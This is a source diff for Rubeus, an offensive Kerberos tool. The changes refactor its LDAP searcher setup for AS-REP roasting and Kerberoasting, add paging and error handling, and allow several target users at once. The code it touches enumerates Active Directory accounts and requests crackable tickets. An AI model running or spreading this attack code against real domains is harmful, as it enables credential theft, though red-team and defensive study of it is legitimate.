@@ -41,79 +41,28 @@ namespace Rubeus
             else {
                 DirectoryEntry directoryObject = null;
                 DirectorySearcher userSearcher = null;
-                string bindPath = "";
-                string domainPath = "";
 
                 try
                 {
-                    if (cred != null)
+                    if (String.IsNullOrEmpty(domainController))
                     {
-                        if (!String.IsNullOrEmpty(OUName))
-                        {
-                            string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
-                            bindPath = String.Format("LDAP://{0}/{1}", cred.Domain, ouPath);
-                        }
-                        else
-                        {
-                            bindPath = String.Format("LDAP://{0}", cred.Domain);
-                        }
+                        domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
                     }
-                    else if ((!String.IsNullOrEmpty(domain)) || !String.IsNullOrEmpty(OUName))
-                    {
-                        if (String.IsNullOrEmpty(domainController))
-                        {
-                            domainController = Networking.GetDCName();
-                        }
-
-                        bindPath = String.Format("LDAP://{0}", domainController);
-
-                        if (!String.IsNullOrEmpty(OUName))
-                        {
-                            string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
-                            bindPath = String.Format("{0}/{1}", bindPath, ouPath);
-                        }
-                        else if (!String.IsNullOrEmpty(domain))
-                        {
-                            domainPath = domain.Replace(".", ",DC=");
-                            bindPath = String.Format("{0}/DC={1}", bindPath, domainPath);
-                        }
-                    }
-
-                    if (!String.IsNullOrEmpty(bindPath))
-                    {
-                        directoryObject = new DirectoryEntry(bindPath);
-                    }
-                    else
-                    {
-                        directoryObject = new DirectoryEntry();
-                    }
-
-                    if (cred != null)
-                    {
-                        // if we're using alternate credentials for the connection
-                        string userDomain = String.Format("{0}\\{1}", cred.Domain, cred.UserName);
-                        directoryObject.Username = userDomain;
-                        directoryObject.Password = cred.Password;
-
-                        using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, cred.Domain))
-                        {
-                            if (!pc.ValidateCredentials(cred.UserName, cred.Password))
-                            {
-                                Console.WriteLine("\r\n[X] Credentials supplied for '{0}' are invalid!", userDomain);
-                                return;
-                            }
-                            else
-                            {
-                                Console.WriteLine("[*] Using alternate creds  : {0}", userDomain);
-                            }
-                        }
-                    }
-
+                    directoryObject = Networking.GetLdapSearchRoot(cred, OUName, domainController, domain);
                     userSearcher = new DirectorySearcher(directoryObject);
+                    // enable LDAP paged search to get all results, by pages of 1000 items
+                    userSearcher.PageSize = 1000;
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
+                    if (ex.InnerException != null)
+                    {
+                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
+                    }
+                    else
+                    {
+                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
+                    }
                     return;
                 }
 
@@ -123,11 +72,11 @@ namespace Rubeus
                     string dirPath = directoryObject.Path;
                     if (String.IsNullOrEmpty(dirPath))
                     {
-                        Console.WriteLine("[*] Searching the current domain for Kerberoastable users");
+                        Console.WriteLine("[*] Searching the current domain for AS-REP roastable users");
                     }
                     else
                     {
-                        Console.WriteLine("[*] Searching path '{0}' for Kerberoastable users", dirPath);
+                        Console.WriteLine("[*] Searching path '{0}' for AS-REP roastable users", dirPath);
                     }
                 }
                 catch (DirectoryServicesCOMException ex)
@@ -188,7 +137,13 @@ namespace Rubeus
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
+                    if (ex.InnerException != null)
+                    {
+                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
+                    } else
+                    {
+                        Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
+                    }
                     return;
                 }
             }
@@ -203,7 +158,7 @@ namespace Rubeus
         {
             // roast AS-REPs for users without pre-authentication enabled
             
-            string dcIP = Networking.GetDCIP(domainController);
+            string dcIP = Networking.GetDCIP(domainController, true, domain);
             if (String.IsNullOrEmpty(dcIP)) { return; }
 
             Console.WriteLine("[*] Building AS-REQ (w/o preauth) for: '{0}\\{1}'", domain, userName);
@@ -335,7 +290,13 @@ namespace Rubeus
                 {
                     if (!String.IsNullOrEmpty(userName))
                     {
-                        Console.WriteLine("[*] Target User            : {0}", userName);
+                        if (userName.Contains(",")) {
+                            Console.WriteLine("[*] Target Users           : {0}", userName);
+                        }
+                        else
+                        {
+                            Console.WriteLine("[*] Target User            : {0}", userName);
+                        }
                     }
                     if (!String.IsNullOrEmpty(domain))
                     {
@@ -349,79 +310,23 @@ namespace Rubeus
 
                 DirectoryEntry directoryObject = null;
                 DirectorySearcher userSearcher = null;
-                string bindPath = "";
-                string domainPath = "";
 
                 try
                 {
-                    if (cred != null)
-                    {
-                        if (!String.IsNullOrEmpty(OUName))
-                        {
-                            string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
-                            bindPath = String.Format("LDAP://{0}/{1}", cred.Domain, ouPath);
-                        }
-                        else
-                        {
-                            bindPath = String.Format("LDAP://{0}", cred.Domain);
-                        }
-                    }
-                    else if ((!String.IsNullOrEmpty(domain)) || !String.IsNullOrEmpty(OUName))
-                    {
-                        if (String.IsNullOrEmpty(dc))
-                        {
-                            dc = Networking.GetDCName();
-                        }
-
-                        bindPath = String.Format("LDAP://{0}", dc);
-
-                        if (!String.IsNullOrEmpty(OUName))
-                        {
-                            string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
-                            bindPath = String.Format("{0}/{1}", bindPath, ouPath);
-                        }
-                        else if (!String.IsNullOrEmpty(domain))
-                        {
-                            domainPath = domain.Replace(".", ",DC=");
-                            bindPath = String.Format("{0}/DC={1}", bindPath, domainPath);
-                        }
-                    }
-
-                    if (!String.IsNullOrEmpty(bindPath))
-                    {
-                        directoryObject = new DirectoryEntry(bindPath);
-                    }
-                    else
-                    {
-                        directoryObject = new DirectoryEntry();
-                    }
-
-                    if (cred != null)
-                    {
-                        // if we're using alternate credentials for the connection
-                        string userDomain = String.Format("{0}\\{1}", cred.Domain, cred.UserName);
-                        directoryObject.Username = userDomain;
-                        directoryObject.Password = cred.Password;
-
-                        using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, cred.Domain))
-                        {
-                            if (!pc.ValidateCredentials(cred.UserName, cred.Password))
-                            {
-                                Console.WriteLine("\r\n[X] Credentials supplied for '{0}' are invalid!", userDomain);
-                                return;
-                            }
-                            else
-                            {
-                                Console.WriteLine("[*] Using alternate creds  : {0}", userDomain);
-                            }
-                        }
-                    }
-
+                    directoryObject = Networking.GetLdapSearchRoot(cred, OUName, dc, domain);
                     userSearcher = new DirectorySearcher(directoryObject);
+                    // enable LDAP paged search to get all results, by pages of 1000 items
+                    userSearcher.PageSize = 1000;
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
+                    if (ex.InnerException != null)
+                    {
+                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
+                    } else
+                    {
+                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
+                    }
                     return;
                 }
 
@@ -456,8 +361,20 @@ namespace Rubeus
                     string userFilter = "";
                     if (!String.IsNullOrEmpty(userName))
                     {
-                        // searching for a specified user, ensuring it's not a disabled account
-                        userFilter = String.Format("(samAccountName={0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2))", userName);
+                        if (userName.Contains(","))
+                        {
+                            // searching for multiple specified users, ensuring they're not disabled accounts
+                            string userPart = "";
+                            foreach (string user in userName.Split(',')) {
+                                userPart += String.Format("(samAccountName={0})", user);
+                            }
+                            userFilter = String.Format("(&(|{0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))", userPart);
+                        }
+                        else
+                        {
+                            // searching for a specified user, ensuring it's not a disabled account
+                            userFilter = String.Format("(samAccountName={0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2))", userName);
+                        }
                     }
                     else
                     {
